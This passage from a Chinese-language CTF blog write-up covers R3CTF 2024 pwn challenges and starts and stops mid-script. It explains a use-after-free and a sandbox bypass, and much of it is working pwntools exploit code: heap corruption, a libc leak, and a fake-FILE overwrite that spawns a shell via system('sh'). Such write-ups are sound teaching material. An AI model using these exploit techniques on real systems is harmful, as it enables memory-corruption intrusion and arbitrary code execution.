class=\"comment\">#elf = ELF(elf_patch)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">size, data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tsa(<span class=\"string\">b&#x27;feedback: &#x27;</span>, data)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx, data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tsa(<span class=\"string\">b&#x27;feedback: &#x27;</span>, data)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tui</span>():</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;4&#x27;</span>)\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># w2m_base + 0x14c0 -&gt; heap_ptr</span></span><br><span class=\"line\"><span class=\"comment\"># pro_base + 0x4a05 -&gt; func_ptr[x]();</span></span><br><span class=\"line\"></span><br><span class=\"line\">script = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">b 123</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"comment\">#debug(script)</span></span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x40</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x40</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>, <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x60</span> + <span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p32(<span class=\"number\">0x14c0</span> - <span class=\"number\">0x30</span> - <span class=\"number\">8</span>) + <span class=\"string\">b&#x27;\\n&#x27;</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x40</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x40</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>, p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span> + p32(<span class=\"number\">0x14c0</span>) + p32(<span class=\"number\">0x424</span>) + p32(<span class=\"number\">0x1228</span> + <span class=\"number\">0x14</span>) + p32(<span class=\"number\">0x1228</span> + <span class=\"number\">0x20</span>) + <span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">1</span>, <span class=\"string\">b&#x27;flag.txt\\x00\\x0a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>, p32(<span class=\"number\">6</span>) + <span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>, p32(<span class=\"number\">1</span>) + <span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">tui()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"Pyploit\"><a href=\"#Pyploit\" class=\"headerlink\" title=\"Pyploit\"></a>Pyploit</h2><p>这道题挺折磨的，有两个 crash， 但是不能利用，能利用的是没法 crash 的洞，利用方式比较困难，在结构体里套结构体的情况下，需要把整个程序完全逆明白才能做出来。</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/6fe9576dcee2ed57f47e4b43abe3b82e.png\" alt=\"6fe9576dcee2ed57f47e4b43abe3b82e\"></p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/e0ea61090d4f061af28cc899c3724cb1.png\" alt=\"e0ea61090d4f061af28cc899c3724cb1\"></p>\n<p>整个程序的功能仅仅是变量赋值和输出变量，其中重点的功能在于存储变量的函数 to_bianlian</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/dded4e64c0f496c3cc0459fb672aa9f9.png\" alt=\"dded4e64c0f496c3cc0459fb672aa9f9\"></p>\n<p>变量的管理方式是一个链表的形式，在存储变量之前会检测变量是否已经被存储了，如果是，则进入 delete 函数，其中 delete 函数存在 uaf 漏洞</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/af9ab95218f408dee21efbe93247c13e.png\" alt=\"af9ab95218f408dee21efbe93247c13e\"></p>\n<p>是在检测 – ptr -&gt; num_value 之后，会进入释放代码，但是因为是先提前 – 了，所以导致了，如果在某一次 – ptr -&gt; num_value &#x3D;&#x3D; 0 时候，会进入释放规则，进行变量的释放，但是因为变量的存储方式（作者说是缓存管理），变量在链表中是不会清空的，只会清空结构体上存放了具体数据的堆块指针，如果通过 var &#x3D; var 代码的话，那么 ptr -&gt; num_value 为负数后，可以在变量被释放的清空下，无限触发 – ptr -&gt; num_value ，导致 UAF </p>\n<p>显然要利用的话，需要让 ptr -&gt; num_value 被一个存储变量（ptr） 信息内存指针占用，这样才能够通过 ptr&#x3D;ptr 代码的方式，去 – 任意内存的值。</p>\n<p>到这里就比较麻烦了，可以看到</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/3b8169e07f32c51cb5d102e369da36fc.png\"></p>\n<p>变量存储时候，是可以超过 100 的限制的</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/d44f2de5549b1c7ebd16bf986de80905.png\"></p>\n<p>从 find_bl_name 时候的结构体偏移，是可以看出， base -&gt; 0x20 处存储的是变量信息，base + 0x340 处存储的是变量名，那么就可以通过 + - 0x320 来互相对应</p>\n<p>如果只是 100 个变量，那么占用的空间是 0x340 + 100*8 &#x3D; 0x660</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/030cfa7deca290e7d0b61b356cd56d1d.png\" alt=\"030cfa7deca290e7d0b61b356cd56d1d\"></p>\n<p>从图中可以看到，下半部分也被变量填充了</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/3c1e2cb38b11628c37be644b99568eb1.png\" alt=\"3c1e2cb38b11628c37be644b99568eb1\"></p>\n<p>在下面的内存中，可以看到，这部分内存是存放的变量信息，也就是 bl_list_top -&gt; ptr[i] 指向的地方</p>\n<p>其中，在申请新变量存储空间的函数中</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/d6203e0e69e755c3fe0335fcb9016242.png\" alt=\"d6203e0e69e755c3fe0335fcb9016242\"></p>\n<p>如果满了，会调用 new_mmap 函数来申请新空间</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/3d253b99d41105425b7fef069d355acd.png\" alt=\"3d253b99d41105425b7fef069d355acd\"></p>\n<p>主要是从 free_mmap 取出，或者新 mmap 一段</p>\n<p>当我们这么分配时候</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">debug(<span class=\"string\">&#x27;b *$rebase(0x14d9)&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">200</span>):</span><br><span class=\"line\">\tscm(<span class=\"string\">f&#x27;dummy<span class=\"subst\">&#123;i&#125;</span> = 3735928559&#x27;</span>.encode())</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">\tscm(<span class=\"string\">f&#x27;dummy<span class=\"subst\">&#123;i&#125;</span>=dummy<span class=\"subst\">&#123;i&#125;</span>&#x27;</span>.encode())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x19a6)\\nb *$rebase(0x1d96)\\n&#x27; + &#x27;c\\n&#x27;*200)\t</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pause()</span><br></pre></td></tr></table></figure>\n\n<p>会将存储 bl_list_top -&gt; ptr[i] 那一段内存放入 free_mmap 中（这里我也没逆太懂分配规则，不是很想去深挖了）</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/8324faea703573d285eb7dfb05d077a5.png\"></p>\n<p>这就导致再接着申请变量时候， new_bl_list_top -&gt; ptr 会覆盖 old_bl_list_top -&gt; ptr ，这样，就可以通过 old_var &#x3D; old_var 无限触发 – old_bl_list_top -&gt; ptr -&gt; num_value ，修改 new_bl_list_top -&gt; ptr  为目标内存地址，再通过 new_var &#x3D; new_var，无限触发  – new_bl_list_top -&gt; ptr -&gt; num_value，实现内存修改。</p>\n<p>这里是攻击 <em>IO_2_1_stdin</em> 的 _IO_buf_base 通过 exit 功能的 getchar 函数进行任意地址写，可参考 Nullullullllu</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> run</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">import</span> tty</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">c = <span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c):</span><br><span class=\"line\">        gdb.attach(p, c)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        gdb.attach(p)</span><br><span class=\"line\">        pause()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sb</span>() : <span class=\"keyword\">return</span> libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>], libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> data : p.send(data)</span><br><span class=\"line\">sa  = <span class=\"keyword\">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class=\"line\">sl  = <span class=\"keyword\">lambda</span> data   :p.sendline(data)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class=\"line\">r   = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>   :p.recv(num)</span><br><span class=\"line\">rl  = <span class=\"keyword\">lambda</span> text   :p.recvuntil(text)</span><br><span class=\"line\">pr = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span> :<span class=\"built_in\">print</span>(p.recv(num))</span><br><span class=\"line\">inter   = <span class=\"keyword\">lambda</span>        :p.interactive()</span><br><span class=\"line\">l32 = <span class=\"keyword\">lambda</span>    :u32(p.recvuntil(<span class=\"string\">b&#x27;\\xf7&#x27;</span>)[-<span class=\"number\">4</span>:].ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">l64 = <span class=\"keyword\">lambda</span>    :u64(p.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span>    :u32(p.recv(<span class=\"number\">4</span>).ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span>    :u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">int16   = <span class=\"keyword\">lambda</span> data   :<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>)</span><br><span class=\"line\">lg= <span class=\"keyword\">lambda</span> s, num   :p.success(<span class=\"string\">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>)<span class=\"comment\">#, log_level=&#x27;debug&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;120.46.65.156&#x27;, 32104)</span></span><br><span class=\"line\">elf_patch = <span class=\"string\">&#x27;./chall&#x27;</span></span><br><span class=\"line\">p = process(elf_patch)</span><br><span class=\"line\">elf = ELF(elf_patch)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">scm</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt;&gt;&gt; &#x27;</span>, data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x14dd)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">200</span>):</span><br><span class=\"line\">\tscm(<span class=\"string\">f&#x27;dummy<span class=\"subst\">&#123;i&#125;</span> = 3735928559&#x27;</span>.encode())</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">\tscm(<span class=\"string\">f&#x27;dummy<span class=\"subst\">&#123;i&#125;</span>=dummy<span class=\"subst\">&#123;i&#125;</span>&#x27;</span>.encode())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x19a6)\\nb *$rebase(0x1d96)\\n&#x27; + &#x27;c\\n&#x27;*200)\t</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x1886)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">13</span>):</span><br><span class=\"line\">\tscm(<span class=\"string\">f&#x27;target<span class=\"subst\">&#123;i&#125;</span> = 1234&#x27;</span>.encode())</span><br><span class=\"line\"></span><br><span class=\"line\">scm(<span class=\"string\">b&#x27;ptr=dummy2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">\tscm(<span class=\"string\">b&#x27;a=-&#x27;</span>)</span><br><span class=\"line\">\tscm(<span class=\"string\">b&#x27;print(a)&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ld_base = <span class=\"built_in\">int</span>(rl(<span class=\"string\">b&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>]) + <span class=\"number\">0xbf70</span></span><br><span class=\"line\">libc_base = ld_base - <span class=\"number\">0x3c5000</span></span><br><span class=\"line\"></span><br><span class=\"line\">stdin = libc_base + libc.sym[<span class=\"string\">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class=\"line\">ptr = ld_base - <span class=\"number\">0xdfa0</span></span><br><span class=\"line\"></span><br><span class=\"line\">count = <span class=\"number\">0</span></span><br><span class=\"line\">value = ptr - (stdin + <span class=\"number\">0x38</span> - <span class=\"number\">0x20</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(value):</span><br><span class=\"line\">\tsl(<span class=\"string\">b&#x27;ptr=ptr&#x27;</span>)</span><br><span class=\"line\">\tcount += <span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(count % <span class=\"number\">0x1000</span> == <span class=\"number\">0</span>):</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(count), <span class=\"built_in\">hex</span>(value))</span><br><span class=\"line\">\t\tp.clean()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x1c9f)\\nb *$rebase(0x1fde)\\n&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;stdin&#x27;</span>, stdin)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x7b</span>):</span><br><span class=\"line\">\tscm(<span class=\"string\">b&#x27;target12=target12&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">system, binsh = get_sb()</span><br><span class=\"line\">_IO_wfile_jumps = libc_base + <span class=\"number\">0x202228</span></span><br><span class=\"line\"></span><br><span class=\"line\">base_addr = libc_base + libc.sym[<span class=\"string\">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">fake_io = <span class=\"string\">b&#x27;  sh;\\x00\\x00\\x00&#x27;</span> </span><br><span class=\"line\">fake_io = fake_io.ljust(<span class=\"number\">0x68</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_io += p64(system)</span><br><span class=\"line\">fake_io = fake_io.ljust(<span class=\"number\">0x88</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_io += p64(base_addr + <span class=\"number\">0x5000</span>) <span class=\"comment\"># _lock</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span></span><br><span class=\"line\">fake_io += p64(base_addr)</span><br><span class=\"line\">fake_io = fake_io.ljust(<span class=\"number\">0xd8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_io += p64(_IO_wfile_jumps - <span class=\"number\">0x20</span>)</span><br><span class=\"line\">fake_io = fake_io.ljust(<span class=\"number\">0xe0</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_io += p64(base_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">scm(<span class=\"string\">b&#x27;exit()&#x27;</span>)</span><br><span class=\"line\">pl = p64(stdin + <span class=\"number\">0x83</span> - <span class=\"number\">1</span>) + p64(stdin + <span class=\"number\">0x83</span> - <span class=\"number\">0x40</span>) + p64(stdin + <span class=\"number\">0x83</span>)*<span class=\"number\">4</span> + p64(base_addr) + p64(base_addr + <span class=\"built_in\">len</span>(fake_io))</span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Do you want to exit? (y or n)&#x27;</span>, pl)</span><br><span class=\"line\"></span><br><span class=\"line\">scm(<span class=\"string\">b&#x27;exit()&#x27;</span>)</span><br><span class=\"line\">sla(<span class=\"string\">b&#x27;Do you want to exit? (y or n)&#x27;</span>, fake_io)</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;ptr&#x27;</span>, ptr)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;ld_base&#x27;</span>, ld_base)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">inter()</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"TradingCenter\"><a href=\"#TradingCenter\" class=\"headerlink\" title=\"TradingCenter\"></a>TradingCenter</h2><p>ptrace 绕沙箱，但是 ROP，折磨</p>\n<p>本地复现时候，为了简单一些，我把 3 功能打开文件输出 pid 的功能修改成了直接输出 getpid 函数的结果</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unsigned __int64 File_Manager()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  signed __int64 v0; // rax</span><br><span class=\"line\">  signed __int64 v2; // [rsp-8h] [rbp-128h] BYREF</span><br><span class=\"line\">  unsigned __int64 v3; // [rsp+118h] [rbp-8h]</span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(0x28u);</span><br><span class=\"line\">  v2 = sys_getpid();</span><br><span class=\"line\">  v0 = sys_write(1u, (const char *)&amp;v2, 4uLL);</span><br><span class=\"line\">  save_money();</span><br><span class=\"line\">  File_Manager_flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v3 - __readfsqword(0x28u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>解题思路是通过 ptrace 修改 沙箱函数中的 push rbp; 为 ret，这样就不会执行沙箱函数了</p>\n<p>exp.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span 